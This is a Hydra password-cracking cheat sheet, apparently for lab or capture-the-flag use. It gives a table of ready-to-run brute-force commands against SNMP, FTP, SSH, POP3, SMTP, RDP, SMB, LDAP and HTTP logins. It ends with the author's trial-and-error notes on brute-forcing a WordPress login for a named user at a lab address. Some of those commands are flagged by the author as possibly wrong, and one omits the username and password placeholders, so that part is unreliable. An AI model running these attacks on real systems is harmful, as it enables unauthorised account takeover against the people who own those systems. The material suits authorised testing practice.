# Hydra-Cheatsheet
Hydra Password Cracking Cheetsheet

The following table uses the $ip variable which can be set with the following command:  

`export ip 10.10.10.1`


| Command                                                                                                                                   | Description                                          |
| ----------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------- |
| hydra -P password-file.txt -v $ip snmp                                                                                                    | Hydra brute force against SNMP                       |
| hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp                                                                       | Hydra FTP known user and rockyou password list       |
| hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh                                                                              | Hydra SSH using list of users and passwords          |
| hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh                                                                         | Hydra SSH using a known password and a username list |
| hydra $ip -s 22 ssh -l <user> -P big_wordlist.txt                                                                                         | Hydra SSH Against Known username on port 22          |
| hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V                                                                          | Hydra POP3 Brute Force                               |
| hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V                                                                                         | Hydra SMTP Brute Force                               |
| hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin                                                                                 | Hydra attack http get 401 login with a dictionary    |
| hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip                                                           | Hydra attack Windows Remote Desktop with rockyou     |
| hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb                                                             | Hydra brute force SMB user with rockyou:             |
| hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' | Hydra brute force a Wordpress admin login            |
| hydra -L usernames.txt -P passwords.txt $ip smb -V -f                                                                                     | SMB Brute Forcing                                    |
| hydra -L users.txt -P passwords.txt $ip ldap2 -V -f                                                                                       | LDAP Brute Forcing                                   |
Use Burp to get info required for website login pages
example:
```html
Cookie: wordpress_test_cookie=WP+Cookie+check; comment_author_4234445d7d75b662059eadc24ba39ce1=aaaaaaaaaaaaaa; comment_author_email_4234445d7d75b662059eadc24ba39ce1=aaaaa%40mail.com; comment_author_url_4234445d7d75b662059eadc24ba39ce1=http%3A%2F%2Faaaaaaaaaaaaaaaaaaaaaa
Upgrade-Insecure-Requests: 1

log=elyana&pwd=Password&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.7.16%2Fwordpress%2Fwp-admin%2F&testcookie=1
```

And the page to interact with, and also note the failed message
```html
POST /wordpress/wp-login.php
```

something like this
```python
hydra -l elyana -P /usr/share/wordlists/rockyou.txt 10.10.7.16 https-post-form "/wordpress/wp-login.php:log=elyana&pwd=Password&wp-submit=Log+In:incorrect" 
```

only this is working atm, but i don't think it's correct.
```python
hydra -l elyana -P /usr/share/wordlists/rockyou.txt 10.10.7.16 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```

```python
hydra -l elyana -P /usr/share/wordlists/rockyou.txt 10.10.7.16 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.7.16%2Fwordpress%2Fwp-admin%2F&testcookie=1'
```

try adding /wordpress, i just noticed it's missing from the latest command
I think we may need to remove the redirect and try with log+in:incorrect, 